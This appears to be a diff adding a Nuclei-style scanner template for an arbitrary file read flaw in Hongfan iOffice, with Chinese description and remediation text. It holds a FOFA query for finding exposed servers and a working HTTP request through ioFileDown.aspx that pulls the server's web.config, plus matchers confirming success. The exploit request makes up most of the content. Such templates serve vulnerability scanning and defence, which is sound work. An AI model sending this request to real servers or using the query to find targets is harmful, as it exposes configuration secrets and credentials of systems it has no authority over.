@@ -1,0 +1,33 @@
+id: hongfan-ioffice-fileread
+
+info:
+  name: 红帆iOffice - 任意文件读取漏洞
+  author: 公众号网络安全透视镜
+  severity: high
+  description: |
+    红帆iOffice存在一个文件读取漏洞，攻击者可以利用这个漏洞读取服务器上的任意文件，如web.config。
+  remediation: |
+    - 确保应用程序正确验证和处理所有输入路径。
+    - 限制应用程序的文件访问权限。
+  metadata:
+    fofa-query: app="红帆-ioffice"
+    verified: true
+  tags: [fileread, "红帆-ioffice", high]
+
+http:
+  - raw:
+      - |
+        GET /ioffice/prg/interface/ioFileDown.aspx?sFilePath=/ioffice/web.config HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: header
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - '<configSections>'
